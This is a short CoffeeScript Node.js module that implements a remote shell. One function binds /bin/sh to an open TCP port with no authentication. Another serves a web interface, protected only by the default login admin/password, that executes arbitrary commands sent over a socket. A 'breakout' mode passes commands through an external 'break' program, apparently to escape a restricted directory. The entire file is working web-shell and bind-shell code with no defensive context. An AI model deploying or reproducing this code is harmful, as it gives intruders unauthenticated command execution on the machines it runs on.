{exec, spawn} = require 'child_process'
path = require 'path'
fusker = require 'fusker'
net = require 'net'
util = require 'util'

module.exports =
  reverse: (port) ->
    sh = spawn '/bin/sh', []
    server = net.createServer (c) ->
      c.pipe sh.stdin
      util.pump sh.stdout, c
    server.listen port
    
  start: (port, username, password) ->
    username ?= 'admin'
    password ?= 'password'
    fusker.config.dir = path.join __dirname, '../public'
    fusker.config.silent = true
    server = fusker.http.createServer port, username, password
    io = fusker.socket.listen server
    breakf = path.join __dirname, "../break"
    
    io.sockets.on 'connection', (socket) ->
      socket.cwd ?= process.cwd()
      socket.emit 'cwd', socket.cwd
      
      socket.on 'command', (msg) ->
      
        if msg.indexOf('breakout') is 0
          socket.cwd = '/'
          socket.emit 'cwd', socket.cwd
          return socket.broken = true
          
        if msg.indexOf('breakin') is 0
          socket.cwd = process.cwd()
          socket.emit 'cwd', socket.cwd
          return socket.broken = false
          
        if msg.indexOf('cd ') is 0
          cd = msg.split(' ')[1]
          socket.cwd = path.resolve socket.cwd, cd
          return socket.emit 'cwd', socket.cwd
            
        if socket.broken  
          msg = "PERL_BADLANG=0 #{breakf} \"#{msg}\" \"#{socket.cwd}\""
          execArgs = {cwd: process.cwd()}
        else
          execArgs = {cwd: socket.cwd}
       
        exec msg, execArgs, (err, stdout, stderr) ->
          socket.emit 'cwd', socket.cwd
          socket.emit 'stdout', stdout if stdout? and stdout isnt ""
          socket.emit 'stderr', stderr if stderr? and stderr isnt ""
          socket.emit 'error', err.message if err? and !stderr
